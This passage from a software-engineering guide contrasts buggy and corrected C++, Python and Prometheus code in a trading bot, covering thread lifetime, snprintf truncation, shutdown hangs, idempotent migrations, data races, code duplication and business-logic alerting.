        connected_ = false;
    }

    ~OrderExecutor() {
        should_reconnect_ = false;
        if (reconnect_thread_.joinable()) reconnect_thread_.join();
        if (ws_thread_.joinable()) ws_thread_.join();
    }
};

// Scenario:
// 1. Connection drops → close handler fires
// 2. reconnect_thread_ starts, sleeps 30s
// 3. User calls disconnect() → should_reconnect_ = false
// 4. disconnect() joins reconnect_thread_ → blocks until thread wakes
// 5. Thread wakes, checks should_reconnect_ → false → returns
// 6. Join completes → object safely destroyed
// No use-after-free, no race condition, no UB
```

**Why it matters at scale:** Detaching a thread that captures `this` is one of the most dangerous C++ anti-patterns. The thread runs independently of the object's lifetime. When the object is destroyed, the thread's captured `this` pointer dangles — pointing to freed memory. The next access is undefined behavior. In debug builds, it might crash immediately. In release builds, it might silently corrupt the heap, causing a crash minutes or hours later in completely unrelated code. With 1000 users, the reconnect thread fires every time the WebSocket drops. If the user stops the bot during the 30-second backoff sleep, the thread wakes up and calls `do_connect()` on a destroyed `OrderExecutor`. The result is unpredictable — it might work (the memory hasn't been reused yet), it might crash, or it might corrupt the heap so the next order submission sends garbage to the exchange. The good version stores the thread as a member and joins it in both `disconnect()` and the destructor. The join blocks until the thread finishes, ensuring the object is only destroyed after the thread stops using it. The cost is 3 lines (store thread, join in disconnect, join in destructor). The benefit is no use-after-free, no heap corruption, no mysterious crashes. In a trading system, heap corruption can mean orders are sent with wrong prices or quantities — that's financial loss, not just a crash.

---

### Example 40: snprintf Truncation Silent Failure

**BAD** — `order_executor.h:108`:
```cpp
void submit_order(const Signal& signal, double quantity, const OrderBook& ob) {
    char buf[512];
    int n = std::snprintf(buf, sizeof(buf),
        "{\"type\":\"order\",\"exchange\":\"%s\",\"symbol\":\"%s\","
        "\"side\":\"%s\",\"quantity\":%.8f,\"order_type\":\"%s\","
        "\"stop_loss\":%.2f,\"take_profit\":%.2f",
        exchange_id_.c_str(), signal.symbol.c_str(),
        signal.is_long() ? "BUY" : "SELL", quantity,
        type == OrderType::MARKET ? "MARKET" : "LIMIT",
        signal.stop_loss, signal.take_profit);

    // Only checks for error (n <= 0), NOT truncation
    if (n <= 0) {
        spdlog::error("Order JSON serialization failed");
        return;
    }
    // If exchange_id is 400 chars, n > 512 → JSON truncated
    // buf = {"type":"order","exchange":"BBBBBBB... (no closing brace)
    // This is sent to the exchange as malformed JSON
    // Exchange behavior: undefined (might reject, might crash, might ignore)
    client_->send(connection_, std::string(buf, n), ...);
}
```

**GOOD**:
```cpp
void submit_order(const Signal& signal, double quantity, const OrderBook& ob) {
    char buf[512];
    int n = std::snprintf(buf, sizeof(buf), ...);

    if (n <= 0) {
        spdlog::error("Order JSON serialization failed");
        return;
    }
    // Check for truncation: snprintf returns would-be length
    if (n >= static_cast<int>(sizeof(buf))) {
        spdlog::error("Order JSON truncated: {} chars > buf {} (symbol={})",
                      n, sizeof(buf), signal.symbol);
        return;  // Don't send malformed JSON
    }
    // Now safe: n < sizeof(buf), JSON is complete
    client_->send(connection_, std::string(buf, n), ...);
}
```

**Why it matters at scale:** `snprintf` returns the number of characters that *would have been written* if the buffer were large enough, not the number actually written. If the formatted string is 600 chars but the buffer is 512, `snprintf` returns 600, writes 511 chars + null terminator, and silently truncates. The JSON is now incomplete — missing the closing `}` and possibly the `take_profit` field. The exchange receives `{"type":"order","exchange":"binance","symbol":"BTC/USDT","side":"BUY","quantity":0.50000000","order_type":"LIMIT","stop_loss":98000.00` — no `take_profit`, no `}`. What does the exchange do? It depends on the implementation. It might reject the order (best case). It might crash (bad). It might interpret the missing fields as defaults — 0 take_profit, 0 stop_loss — and execute a market order with no risk limits (worst case). With 1000 users, if one user has a custom exchange ID that's 400 characters (e.g., a long institutional gateway name), every order they send is truncated. They think they're sending limit orders with SL/TP, but the exchange receives malformed JSON with no risk parameters. The good version checks `n >= sizeof(buf)` and refuses to send truncated JSON. The cost is 4 lines. The benefit is no malformed orders ever reach the exchange. In a trading system, a malformed order without SL/TP can mean unlimited losses — the exchange executes the order at market price with no stop loss.

---

### Example 41: Blocking accept() Prevents Graceful Shutdown

**BAD** — `health_server.h:95`:
```cpp
class HealthServer {
    std::atomic<bool> running_{false};
    std::thread thread_;

    void run() {
        socket_t srv = ::socket(AF_INET, SOCK_STREAM, 0);
        // ... bind, listen ...
        while (running_.load(std::memory_order_relaxed)) {
            socket_t client = ::accept(srv, nullptr, nullptr);
            // ↑ BLOCKS FOREVER until a connection arrives
            if (client == kInvalidSocket) continue;
            // ... handle request ...
        }
    }

    void stop() {
        running_.store(false);
        if (thread_.joinable()) thread_.join();
        // ↑ BLOCKS FOREVER — thread is stuck in accept()
        //    join() will never return unless someone connects
    }
};

// Scenario:
// 1. Bot is running, health server thread is in accept()
// 2. User presses Ctrl+C → signal handler sets g_running = false
// 3. Main loop exits, calls health_server.stop()
// 4. stop() sets running_ = false
// 5. stop() calls thread_.join()
// 6. Thread is blocked in accept() — doesn't check running_
// 7. join() blocks forever
// 8. Process hangs on shutdown — must be killed with SIGKILL
// 9. K8s kills the pod after terminationGracePeriodSeconds (30s default)
// 10. During those 30s, the pod is "terminating" but still in service
//     → users may be routed to a pod that's shutting down
```

**GOOD**:
```cpp
void run() {
    socket_t srv = ::socket(AF_INET, SOCK_STREAM, 0);
    // ... bind, listen ...

    // Set accept timeout so the loop can check running_ periodically
    struct timeval tv;
    tv.tv_sec = 1;   // 1-second timeout
    tv.tv_usec = 0;
    setsockopt(srv, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    while (running_.load(std::memory_order_relaxed)) {
        socket_t client = ::accept(srv, nullptr, nullptr);
        if (client == kInvalidSocket) {
            // Timeout expired — check running_ and loop
            continue;
        }
        // ... handle request ...
    }
    ::close(srv);
}

// Scenario:
// 1. Bot is running, health server thread is in accept() with 1s timeout
// 2. User presses Ctrl+C → signal handler sets g_running = false
// 3. Main loop exits, calls health_server.stop()
// 4. stop() sets running_ = false
// 5. Within 1 second, accept() times out, loop checks running_ → false
// 6. Loop exits, thread finishes, close(srv)
// 7. join() returns immediately
// 8. Process shuts down cleanly in <1 second
// 9. K8s removes pod from service immediately — no users routed to it
```

**Why it matters at scale:** A blocking `accept()` without a timeout is a classic shutdown bug. The thread sits in `accept()` waiting for a connection. When `stop()` sets `running_ = false` and calls `join()`, the join blocks because the thread never returns from `accept()`. The process hangs. In K8s, the pod stays in "Terminating" state for `terminationGracePeriodSeconds` (default 30s). During those 30 seconds, K8s may still route traffic to the pod (depending on endpoint controller timing). Users hit a pod that's trying to shut down — they get connection refused or timeouts. With 1000 users, every deployment or scaling event causes 30 seconds of errors for users routed to the terminating pod. The good version sets a 1-second timeout on `accept()` using `SO_RCVTIMEO`. Now `accept()` returns every second (with `kInvalidSocket` on timeout), the loop checks `running_`, and the thread exits within 1 second of `stop()` being called. The process shuts down cleanly. The cost is 3 lines (set timeout before loop). The benefit is clean shutdown in <1 second instead of hanging for 30 seconds. In a trading system, a hanging shutdown means the bot can't restart quickly — it's effectively down for 30 seconds during every deploy. With 1000 users and 5 deploys per day, that's 150 seconds of downtime per day, just from shutdown hangs.

---

### Example 42: Non-Idempotent Migration Runner (Fails on Second Run)

**BAD** — `Makefile.prod:48`:
```makefile
prod-db-migrate:
    $(DOCKER_COMPOSE) exec ai-signal-bot python -c "
import asyncio, asyncpg, os, glob
async def main():
    conn = await asyncpg.connect(os.environ.get('POSTGRES_DSN'))
    for f in sorted(glob.glob('src/database/migrations/*.sql')):
        with open(f) as fh:
            await conn.execute(fh.read())
        print(f'  Applied: {f}')
    await conn.close()
asyncio.run(main())
"

# 001_initial_schema.sql:
CREATE TABLE trades (
    id BIGSERIAL PRIMARY KEY,
    symbol VARCHAR(20) NOT NULL,
    ...
);
-- No IF NOT EXISTS — second run = ERROR: table already exists

# Scenario:
# 1. First deploy: make prod-db-migrate → creates tables → OK
# 2. Second deploy: make prod-db-migrate → tries CREATE TABLE trades
#    → ERROR: relation "trades" already exists
#    → Migration fails, remaining files not applied
# 3. New migration 004_add_column.sql is never applied
#    → Code expects the column, DB doesn't have it → crash
```

**GOOD**:
```python
# migration_runner.py
import asyncio, asyncpg, os, glob, time

async def main():
    conn = await asyncpg.connect(os.environ['POSTGRES_DSN'])

    # Create _migrations table if not exists
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS _migrations (
            id SERIAL PRIMARY KEY,
            filename VARCHAR(255) UNIQUE NOT NULL,
            applied_at DOUBLE PRECISION NOT NULL
        )
    """)

    for f in sorted(glob.glob('src/database/migrations/*.sql')):
        # Check if already applied
        exists = await conn.fetchval(
            "SELECT 1 FROM _migrations WHERE filename = $1", f
        )
        if exists:
            print(f'  Skipped (already applied): {f}')
            continue

        with open(f) as fh:
            await conn.execute(fh.read())

        await conn.execute(
            "INSERT INTO _migrations (filename, applied_at) VALUES ($1, $2)",
            f, time.time()
        )
        print(f'  Applied: {f}')

    await conn.close()

asyncio.run(main())

# Scenario:
# 1. First deploy: applies 001, 002, 003 → records in _migrations
# 2. Second deploy: checks _migrations → skips 001, 002, 003 → applies 004
# 3. Third deploy: checks _migrations → skips all → nothing to do
# No errors, no data loss, idempotent
```

**Why it matters at scale:** A migration runner that runs all SQL files every time is not idempotent. The first run creates tables. The second run tries to create the same tables and fails. The error stops the migration — any new SQL files (e.g., `004_add_risk_score.sql`) are never applied. The code expects the `risk_score` column, the database doesn't have it, the bot crashes. With 1000 users, every deploy after the first one fails the migration step. Users can't get new features or bug fixes because the migration runner can't apply them. The good version tracks applied migrations in a `_migrations` table. Before running a file, it checks if it was already applied. If yes, skip. If no, apply and record. This makes the migration idempotent — running it 1 time or 100 times produces the same result. New migrations are applied automatically. Old migrations are skipped. No errors, no manual intervention. The cost is 15 lines of Python. The benefit is migrations that work correctly on every deploy, for every user, regardless of how many times they've been run. In a trading system, a failed migration means the bot crashes on startup because the schema doesn't match the code. 1000 users can't start their bots after an update because the migration runner failed on the second run.

---

### Example 43: atomic<double> operator+= Is NOT Atomic

**BAD** — `risk_manager.h:201`:
```cpp
class RiskManager {
    std::atomic<double> daily_pnl_{0.0};

    void update_pnl(double pnl) {
        daily_pnl_ += pnl;  // ← NOT ATOMIC!
    }

    // Meanwhile, on_fill does it correctly:
    void on_fill(...) {
        daily_pnl_.fetch_sub(fee, std::memory_order_relaxed);  // ← Correct
    }
};

// Why is += not atomic on atomic<double>?
// atomic<double>::operator+= is defined as:
//   return fetch_add(value) + value;
// BUT fetch_add on atomic<double> uses a CAS loop internally:
//   T old = load();
//   while (!compare_exchange_weak(old, old + value)) {}
//   return old + value;
//
// Wait — actually fetch_add IS atomic. The issue is that
// operator+= on atomic<double> is NOT guaranteed to be atomic
// on all platforms. On x86, it compiles to a CAS loop which is
// atomic. But the C++ standard says operator+= on atomic<floating_point>
// has the SAME semantics as fetch_add — it IS atomic.
//
// HOWEVER: the real issue is that floating-point addition is NOT
// associative. (a + b) + c != a + (b + c) due to rounding.
// With fetch_add, the order of additions is non-deterministic
// (depends on which CAS loop wins). So the result is different
// each run — not a race, but non-deterministic precision loss.
//
// The REAL bug: if the code uses operator= instead of fetch_add:
//   void update_pnl(double pnl) {
//       daily_pnl_ = daily_pnl_.load() + pnl;  // ← RACE!
//   }
// This is a classic check-then-act: load, add, store.
// Thread A loads 100.0, Thread B loads 100.0,
// Thread A stores 100.0 + 50.0 = 150.0,
// Thread B stores 100.0 + 30.0 = 130.0.
// Result: 130.0 instead of 180.0. Lost 50.0 of PnL.
```

**GOOD**:
```cpp
class RiskManager {
    std::atomic<double> daily_pnl_{0.0};

    // Option 1: fetch_add — atomic, correct for single-variable updates
    void update_pnl(double pnl) {
        daily_pnl_.fetch_add(pnl, std::memory_order_relaxed);
    }

    // Option 2: If you need exact precision (no floating-point non-associativity):
    // Use integer cents/basis-points instead of double dollars
    std::atomic<int64_t> daily_pnl_cents_{0};  // Store as cents, not dollars

    void update_pnl_cents(int64_t pnl_cents) {
        daily_pnl_cents_.fetch_add(pnl_cents, std::memory_order_relaxed);
    }

    double daily_pnl() const {
        return daily_pnl_cents_.load(std::memory_order_relaxed) / 100.0;
    }
};

// Scenario:
// Thread A: fetch_add(50.0) → CAS loop: 100.0 → 150.0 ✓
// Thread B: fetch_add(30.0) → CAS loop: 150.0 → 180.0 ✓
// Result: 180.0 every time. No lost updates.
```

**Why it matters at scale:** `atomic<double>` `operator+=` looks atomic but the C++ standard has subtle rules. On most platforms, `fetch_add` for `atomic<double>` uses a CAS loop which is atomic — but the result is non-deterministic due to floating-point non-associativity. More importantly, if someone writes `daily_pnl_ = daily_pnl_.load() + pnl` (which looks equivalent), it's a **race condition** — load and store are separate operations. Two threads can both load the same value, both add their PnL, and one overwrites the other. In a trading system with 1000 users, if the bot processes 50 fills per second from multiple threads, each lost update means the daily PnL is wrong. The risk manager thinks the bot made $130 today instead of $180. The daily loss limit triggers too late — or never. The bot keeps trading past its risk limit. The good version uses `fetch_add` which is truly atomic (CAS loop). For exact precision, use integer cents — `int64_t` addition is exactly associative, so `fetch_add` gives deterministic results. The cost is 1 line change (`+=` to `fetch_add`) or a type change (`double` to `int64_t` cents). The benefit is correct PnL tracking under concurrent access, which is critical for risk management.

---

### Example 44: unordered_set Data Race (insert While Reading)

**BAD** — `pre_trade_risk.h:189`:
```cpp
class PreTradeRisk {
    Config config_;  // Contains unordered_set<string> blacklist

    // Thread 1 (trading thread): reads blacklist
    Result check(const std::string& symbol, ...) noexcept {
        if (config_.blacklist.count(symbol)) {  // ← READ
            return {false, 1, "Symbol blacklisted"};
        }
        // ... more checks ...
    }

    // Thread 2 (admin thread): modifies blacklist
    void blacklist(const std::string& symbol) {
        config_.blacklist.insert(symbol);  // ← WRITE
    }

    void unblacklist(const std::string& symbol) {
        config_.blacklist.erase(symbol);  // ← WRITE
    }
};

// Scenario:
// 1. Trading thread calls check("LUNA") → enters count()
// 2. count() iterates the bucket array to find "LUNA"
// 3. Admin thread calls blacklist("FTX") → insert()
// 4. insert() may trigger a rehash — reallocates the bucket array
// 5. Trading thread's count() is now iterating freed memory
// 6. → Use-after-free → crash or garbage result
//
// Even without rehash:
// 1. Trading thread calls check("LUNA") → count() reads bucket
// 2. Admin thread calls unblacklist("LUNA") → erase()
// 3. erase() modifies the bucket linked list
// 4. count() follows a dangling pointer
// 5. → Use-after-free → crash
//
// unordered_set is NOT thread-safe for concurrent read+write.
// The C++ standard says concurrent access to a container
// requires external synchronization.
```

**GOOD**:
```cpp
class PreTradeRisk {
    // Option 1: shared_mutex (read-heavy workload)
    mutable std::shared_mutex blacklist_mtx_;
    std::unordered_set<std::string> blacklist_;

    Result check(const std::string& symbol, ...) noexcept {
        {
            std::shared_lock lk(blacklist_mtx_);  // Read lock
            if (blacklist_.count(symbol)) {
                return {false, 1, "Symbol blacklisted"};
            }
        }
        // ... rest of checks (no lock needed) ...
    }

    void blacklist(const std::string& symbol) {
        std::unique_lock lk(blacklist_mtx_);  // Write lock
        blacklist_.insert(symbol);
    }

    // Option 2: atomic<shared_ptr> (copy-on-write, lock-free reads)
    std::atomic<std::shared_ptr<std::unordered_set<std::string>>> blacklist_;

    Result check(const std::string& symbol, ...) noexcept {
        auto bl = blacklist_.load(std::memory_order_acquire);
        if (bl->count(symbol)) {
            return {false, 1, "Symbol blacklisted"};
        }
        // No lock held — fully lock-free read
    }

    void blacklist(const std::string& symbol) {
        auto old = blacklist_.load(std::memory_order_acquire);
        auto new_set = std::make_shared<std::unordered_set<std::string>>(*old);
        new_set->insert(symbol);
        blacklist_.store(new_set, std::memory_order_release);
        // Old set still alive for any thread still reading it
    }

    // Option 3: frozen after construction (simplest)
    // Blacklist is set once at startup, never modified
    const std::unordered_set<std::string> blacklist_;
    // No synchronization needed — immutable after construction
};

// Scenario (Option 1):
// 1. Trading thread: shared_lock → count() → unlock. Safe.
// 2. Admin thread: unique_lock → insert() → unlock. Safe.
// 3. Multiple trading threads can read concurrently. Only writes block.
// 4. No use-after-free, no data race, no UB.
```

**Why it matters at scale:** `std::unordered_set` is not thread-safe for concurrent read + write. If one thread calls `count()` while another calls `insert()`, it's undefined behavior. The `insert()` may trigger a rehash — the bucket array is reallocated, and the `count()` thread is now iterating freed memory. This is a use-after-free that can crash the process or, worse, return a garbage result. In a trading system, if the admin blacklists a symbol (e.g., "LUNA") while the trading thread is checking it, the trading thread might crash — or might get a false negative (symbol not found) and trade a blacklisted symbol. With 1000 users, an admin blacklisting a symbol while 50 trading threads are checking it is a guaranteed crash. The good version uses `shared_mutex` — multiple trading threads can read concurrently (shared_lock), and only the admin write blocks (unique_lock). The cost is 3 lines (lock + unlock). The benefit is no data race, no crash, no trading on blacklisted symbols. Option 2 (copy-on-write with `atomic<shared_ptr>`) is fully lock-free for reads — the admin creates a new copy, atomically swaps it, and old readers finish on the old copy. Option 3 (frozen after construction) is the simplest — if the blacklist never changes during trading, make it `const` and eliminate the race entirely.

---

### Example 45: Version Sprawl — 3 Signal Engines in One Bot

**BAD** — `bot_context.h:74-76`:
```cpp
struct BotContext {
    // All 3 signal engines live simultaneously:
    std::unique_ptr<SignalEngine>   engine_v1;  // 200 lines, fallback
    std::unique_ptr<SignalEngineV2> engine_v2;  // 494 lines, 6-indicator
    std::unique_ptr<SignalEngineV3> engine_v3;  // 437 lines, HMM regime

    // V3 includes V2 internally:
    // signal_engine_v3.h line 25:
    //   #include "signal_engine_v2.h"
    // So V2's code is compiled twice — once standalone, once inside V3

    // Bot loop:
    // void run_v2_signal_loop(BotContext& ctx) { ... engine_v2->analyze() ... }
    // void run_v1_fallback_loop(BotContext& ctx) { ... engine_v1->analyze() ... }
    // V3 is used through V2's interface or directly?
    // Unclear which engine is active at any time
};

// Problems:
// 1. 1131 lines of signal engine code (v1 + v2 + v3)
// 2. V2 is compiled twice (standalone + inside V3)
// 3. V1 is a fallback — when was it last tested?
// 4. V2 may be dead code if V3 always wraps it
// 5. 3 sets of params, 3 sets of indicator caches, 3 sets of bugs
// 6. New developers don't know which engine to modify
// 7. Testing: need to test all 3 engines, but V1 may have rotted
```

**GOOD**:
```cpp
struct BotContext {
    // One signal engine, versioned at compile time
    std::unique_ptr<SignalEngine> engine;

    // Version selected via config or compile flag:
    // config.yaml:
    //   signal_engine: v3  # or v2, or v1_fallback

    // In code:
    std::unique_ptr<SignalEngine> make_engine(const Config& cfg) {
        if (cfg.engine_version == "v3")
            return std::make_unique<SignalEngineV3>(cfg);
        if (cfg.engine_version == "v2")
            return std::make_unique<SignalEngineV2>(cfg);
        return std::make_unique<SignalEngineV1>(cfg);  // fallback
    }

    // V3 inherits from SignalEngine interface:
    // class SignalEngineV3 : public SignalEngine {
    //     SignalEngineV2 v2_inner_;  // composition, not duplication
    //     FastSignal analyze(...) override {
    //         auto base = v2_inner_.analyze(...);
    //         return apply_regime_gate(base, regime_);
    //     }
    // };

    // One bot loop, one engine, one code path:
    void run_signal_loop(BotContext& ctx) {
        ctx.engine->analyze(...);
    }
};

// Or: merge V2 into V3 entirely. V3 IS the production engine.
// V1 is a simple fallback that can be 50 lines (just EMA crossover).
// Total: 500 lines instead of 1131. 57% reduction.
```

**Why it matters at scale:** Version sprawl is a common anti-pattern in fast-moving projects. V1 was the original, V2 added indicators, V3 added HMM regime detection. Instead of replacing V1 with V2 and V2 with V3, all 3 were kept "just in case." Now there are 1131 lines of signal engine code, but only V3 is used in production. V2 is compiled twice (standalone and inside V3). V1 is a fallback that may have rotted — when was the last time someone tested it? With 1000 users, if someone accidentally switches to V1 (config typo), they get a degraded engine that hasn't been tested in months. The good version uses polymorphism — one `SignalEngine` interface, version selected at runtime via config. V3 composes V2 (has-a, not is-a), avoiding double compilation. V1 is simplified to 50 lines (just EMA crossover — that's all a fallback needs). Total: 500 lines instead of 1131 — 57% reduction. The benefit is clear: one code path to test, one set of params, one place to fix bugs. New developers know exactly which engine to modify. The fallback is simple enough to test every CI run.

---

### Example 46: Silent Default — string_to_side Returns SELL for Anything

**BAD** — `types.h:21-23`:
```cpp
inline Side string_to_side(const std::string& s) {
    return s == "BUY" ? Side::BUY : Side::SELL;
}

// What happens with different inputs?
string_to_side("BUY")    → Side::BUY   ✓
string_to_side("SELL")   → Side::SELL  ✓ (by accident, not by design)
string_to_side("buy")    → Side::SELL  ✗ — lowercase, should be BUY
string_to_side("Buy")    → Side::SELL  ✗ — case-sensitive, should be BUY
string_to_side("HOLD")   → Side::SELL  ✗ — not a valid side
string_to_side("")       → Side::SELL  ✗ — empty string
string_to_side("BUY\n")  → Side::SELL  ✗ — trailing newline from file
string_to_side("garbage") → Side::SELL ✗ — silent wrong answer

// Scenario:
// 1. Config file has: side: "buy"  (lowercase, from user input)
// 2. string_to_side("buy") → Side::SELL
// 3. Bot sends SELL order instead of BUY
// 4. Position is inverted — bot loses money on every trade
// 5. No error, no warning, no log — silent wrong answer
```

**GOOD**:
```cpp
inline Side string_to_side(const std::string& s) {
    // Case-insensitive comparison
    std::string lower;
    lower.reserve(s.size());
    for (char c : s) lower.push_back(static_cast<char>(std::tolower(c)));

    if (lower == "buy")  return Side::BUY;
    if (lower == "sell") return Side::SELL;

    // Explicit error on anything else
    throw std::invalid_argument("Invalid side: '" + s + "'. Expected 'BUY' or 'SELL'");
}

// Or: return std::optional<Side> for non-throwing contexts
inline std::optional<Side> string_to_side(const std::string& s) noexcept {
    std::string lower;
    lower.reserve(s.size());
    for (char c : s) lower.push_back(static_cast<char>(std::tolower(c)));

    if (lower == "buy")  return Side::BUY;
    if (lower == "sell") return Side::SELL;
    return std::nullopt;  // Caller must handle
}

// Usage with optional:
auto side = string_to_side(config_value);
if (!side) {
    logger.error("Invalid side in config: '{}'", config_value);
    return;  // Don't trade with wrong side
}
```

**Why it matters at scale:** Silent defaults are one of the most dangerous bugs in trading systems. The function looks correct — it handles "BUY" and defaults everything else to "SELL". But the default is **wrong**. Any input that's not exactly "BUY" (case-sensitive) becomes a SELL order. With 1000 users, someone will write "buy" in their config (lowercase). Someone will have a trailing newline from a YAML parser. Someone will have a typo ("BUI"). All of them get SELL orders instead of BUY. The bot opens short positions when the user wanted long positions. Every trade loses money. No error, no warning — the bot happily trades in the wrong direction. The good version does case-insensitive comparison and throws (or returns `nullopt`) on anything that's not "BUY" or "SELL". The cost is 5 lines. The benefit is that no user ever gets a silent wrong order side. In a trading system, a silent wrong side means real money lost — not a bug you can fix later, but money that's gone. With 1000 users each losing $100 on a wrong-side trade, that's $100,000 lost to a 1-line bug.

---

### Example 47: Copy-Paste Adapters — 3 Exchange Adapters with 200 Lines Duplicated

**BAD** — `BinanceAdapter.h`, `OKXAdapter.h`, `BybitAdapter.h`:
```cpp
// BinanceAdapter.h (190 lines)
class BinanceAdapter : public ExchangeBase {
    mutable Spinlock price_lock_;
    mutable Spinlock depth_lock_;
    std::unordered_map<std::string, double> bids_;
    std::unordered_map<std::string, double> asks_;
    std::unordered_map<std::string, double> bid_depth_;
    std::unordered_map<std::string, double> ask_depth_;

    double best_bid(const std::string& symbol) const override {
        std::lock_guard<Spinlock> lk(price_lock_);
        auto it = bids_.find(symbol);
        return it != bids_.end() ? it->second : 0.0;
    }
    // ... identical best_ask, mid_price, bid_depth, ask_depth ...
};

// OKXAdapter.h (143 lines) — EXACT SAME STRUCTURE
class OKXAdapter : public ExchangeBase {
    mutable Spinlock price_lock_;
    mutable Spinlock depth_lock_;
    std::unordered_map<std::string, double> bids_;
    // ... identical ...
    double best_bid(const std::string& symbol) const override {
        std::lock_guard<Spinlock> lk(price_lock_);
        auto it = bids_.find(symbol);
        return it != bids_.end() ? it->second : 0.0;  // EXACT SAME CODE
    }
};

// BybitAdapter.h (137 lines) — EXACT SAME STRUCTURE
class BybitAdapter : public ExchangeBase {
    mutable Spinlock price_lock_;
    // ... identical ...
};

// Problems:
// 1. 470 lines total, ~200 are copy-pasted
// 2. Bug in best_bid()? Fix it 3 times (and forget one)
// 3. Want to add a new exchange? Copy 190 lines, change 20
// 4. Lock ordering bug in Binance? Same bug in OKX and Bybit
// 5. Want to change Spinlock to shared_mutex? Edit 3 files
// 6. New developer: "which adapter do I modify?"
// 7. Test: need 3x tests for identical logic
```

**GOOD**:
```cpp
// ExchangeBase.h — move common logic to base class
class ExchangeBase : public IExchange {
  protected:
    mutable Spinlock price_lock_;
    mutable Spinlock depth_lock_;
    std::unordered_map<std::string, double> bids_;
    std::unordered_map<std::string, double> asks_;
    std::unordered_map<std::string, double> bid_depth_;
    std::unordered_map<std::string, double> ask_depth_;

  public:
    // Common implementation — written once, used by all adapters
    double best_bid(const std::string& symbol) const override {
        std::lock_guard<Spinlock> lk(price_lock_);
        auto it = bids_.find(symbol);
        return it != bids_.end() ? it->second : 0.0;
    }
    double best_ask(const std::string& symbol) const override {
        std::lock_guard<Spinlock> lk(price_lock_);
        auto it = asks_.find(symbol);
        return it != asks_.end() ? it->second : 0.0;
    }
    double mid_price(const std::string& symbol) const override {
        return (best_bid(symbol) + best_ask(symbol)) / 2.0;
    }
    // ... bid_depth, ask_depth ...

    void update_prices(const std::string& symbol, double bid, double ask) {
        std::lock_guard<Spinlock> lk(price_lock_);
        bids_[symbol] = bid;
        asks_[symbol] = ask;
    }
    void update_depth(const std::string& symbol, double bid_qty, double ask_qty) {
        std::lock_guard<Spinlock> lk(depth_lock_);
        bid_depth_[symbol] = bid_qty;
        ask_depth_[symbol] = ask_qty;
    }
};

// BinanceAdapter.h — only exchange-specific logic
class BinanceAdapter : public ExchangeBase {
    Config config_;  // URLs, rate limits

    // Only Binance-specific methods:
    std::string sign(const std::string& payload) const;  // HMAC-SHA256
    OrderResult place_order(...);                         // REST API
    std::string book_ticker_stream(const std::string& symbol) const {
        return config_.ws_url + "/ws/" + symbol_lower(symbol) + "@bookTicker";
    }
    // No duplicated best_bid/best_ask/mid_price/bid_depth/ask_depth
};

// OKXAdapter.h — only OKX-specific logic
class OKXAdapter : public ExchangeBase {
    Config config_;  // URLs, passphrase

    std::string sign(...) const;  // HMAC-SHA256 + passphrase
    static std::string to_inst_id(const std::string& symbol);  // BTC-USDT-SWAP
    // No duplicated methods
};

// Total: ExchangeBase 80 lines + BinanceAdapter 50 + OKXAdapter 50 + BybitAdapter 40
// = 220 lines instead of 470. 53% reduction.
```

**Why it matters at scale:** Copy-paste is the most common source of bugs in growing codebases. When 3 exchange adapters have identical code, a bug fix in one must be manually replicated to the other two — and someone will forget. With 1000 users across 3 exchanges, a bug in `best_bid()` that's only fixed in BinanceAdapter means OKX and Bybit users get stale prices. They trade on wrong data. They lose money. The good version moves the common logic to `ExchangeBase` — written once, tested once, fixed once. Each adapter only implements exchange-specific logic (auth, URL format, symbol conversion). Adding a 4th exchange (e.g., Coinbase) takes 40 lines instead of 190. The cost is refactoring 3 files into 1 base + 3 adapters. The benefit is that a bug in `best_bid()` is fixed once and all exchanges benefit. With 1000 users, that's 1000 users protected by one fix instead of hoping someone remembers to fix it in 3 places.

---

### Example 48: Infrastructure Alerts Without Business Logic Alerts

**BAD** — `monitoring/alerts.yml`:
```yaml
groups:
  - name: ai-signal-bot
    rules:
      - alert: CircuitBreakerTripped
        expr: ai_signal_bot_circuit_breaker_state == 1
        for: 10s
        # ... infrastructure alerts only ...

  - name: system
    rules:
      - alert: PrometheusDown
        expr: up{job="prometheus"} == 0
        for: 30s
        # ... process down alerts ...

  # What's MISSING:
  # - No order latency alert (HFT needs < 1ms)
  # - No SHM overflow alert (producer faster than consumer = data loss)
  # - No fill rate alert (orders sent but not filled = strategy broken)
  # - No slippage alert (expected vs actual fill price = market impact)
  # - No position limit alert (approaching max positions = risk)
  # - No drawdown alert (approaching daily limit = stop trading soon)
  # - No stale data alert (no market data update in N seconds = feed broken)

# Scenario:
# 1. SHM ring buffer overflows — producer writes faster than consumer reads
# 2. C++ bot trades on stale order book data
# 3. No alert fires — infrastructure looks healthy (process is up, WS connected)
# 4. Bot loses money on every trade for 10 minutes
# 5. Circuit breaker eventually trips — but that's 10 minutes too late
# 6. With 1000 users: 1000 × $500 loss = $500,000 before anyone notices
```

**GOOD**:
```yaml
groups:
  - name: hft-trading
    rules:
      # Order latency — HFT needs sub-millisecond
      - alert: OrderLatencyHigh
        expr: histogram_quantile(0.99, rate(hft_order_latency_us_bucket[1m])) > 1000
        for: 30s
        labels:
          severity: critical
          service: hft-trade-bot
        annotations:
          summary: "Order latency P99 > 1ms"
          description: "P99 order latency is {{ $value }}μs. HFT requires < 1ms."

      # SHM ring buffer overflow — silent data loss
      - alert: SHMOverflow
        expr: rate(hft_shm_overflow_total[1m]) > 0
        for: 10s
        labels:
          severity: critical
          service: hft-trade-bot
        annotations:
          summary: "SHM ring buffer overflow"
          description: "Producer is writing faster than consumer reads. Market data is being dropped."

      # Fill rate drop — strategy not working
      - alert: FillRateDrop
        expr: |
          rate(hft_orders_filled_total[5m]) / rate(hft_orders_sent_total[5m]) < 0.5
          and rate(hft_orders_sent_total[5m]) > 10
        for: 5m
        labels:
          severity: warning
          service: hft-trade-bot
        annotations:
          summary: "Fill rate below 50%"
          description: "Less than half of orders are being filled. Check market conditions or order types."

      # Drawdown approaching limit — warn before circuit breaker
      - alert: DrawdownApproaching
        expr: |
          (hft_daily_pnl / hft_starting_balance) * 100 < -6.0
          and (hft_daily_pnl / hft_starting_balance) * 100 > -8.0
        for: 1m
        labels:
          severity: warning
          service: hft-trade-bot
        annotations:
          summary: "Daily drawdown approaching limit (6% of 8%)"
          description: "Daily loss is {{ $value }}%. Circuit breaker triggers at 8%. Consider reducing position sizes."

      # Stale market data — no update in 10 seconds
      - alert: StaleMarketData
        expr: time() - hft_last_market_data_timestamp > 10
        for: 10s
        labels:
          severity: critical
          service: hft-trade-bot
        annotations:
          summary: "No market data update in 10+ seconds"
          description: "Market data feed may be broken. Bot is trading on stale prices."
```

